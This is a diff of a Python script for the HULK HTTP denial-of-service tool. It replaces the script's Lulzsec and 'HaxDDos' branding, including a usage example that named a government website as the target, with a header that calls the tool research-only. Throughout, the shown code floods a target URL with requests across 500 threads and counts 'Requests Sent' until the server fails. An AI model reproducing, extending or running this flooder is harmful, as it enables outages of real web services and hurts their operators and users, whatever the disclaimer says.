@@ -1,4 +1,12 @@
-
+# ----------------------------------------------------------------------------------------------
+# HULK - HTTP Unbearable Load King
+#
+# this tool is a dos tool that is meant to put heavy load on HTTP servers in order to bring them
+# to their knees by exhausting the resource pool, its is meant for research purposes only
+# and any malicious usage of this tool is prohibited.
+#
+# author :  Barry Shteiman , version 1.0
+# ----------------------------------------------------------------------------------------------
 import urllib2
 import sys
 import threading
@@ -62,7 +70,7 @@ def buildblock(size):
 
 def usage():
 	print '---------------------------------------------------'
-	print 'USAGE: HaxDDos.py <url> (ex. HaxDDos.py http://www.gov.ph)'
+	print 'USAGE: python hulk.py <url>'
 	print 'you can add "safe" after url, to autoshut after dos'
 	print '---------------------------------------------------'
 
@@ -89,7 +97,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print 'Flood request sent'
+			print 'Response Code 500'
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -120,7 +128,7 @@ class MonitorThread(threading.Thread):
 				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "Work Done!"
+			print "\n-- HULK Attack Finished --"
 
 #execute 
 if len(sys.argv) < 2:
@@ -131,15 +139,15 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "[+] Lulzsec started an attack [+]"
+		print "-- HULK Attack Started --"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
 		url = sys.argv[1]
 		if url.count("/")==2:
 			url = url + "/"
-		m = re.search('http\://([^/]*)/?.*', url)
-		host = m.group(1)
+		m = re.search('(https?\://)?([^/]*)/?.*', url)
+		host = m.group(2)
 		for i in range(500):
 			t = HTTPThread()
 			t.start()
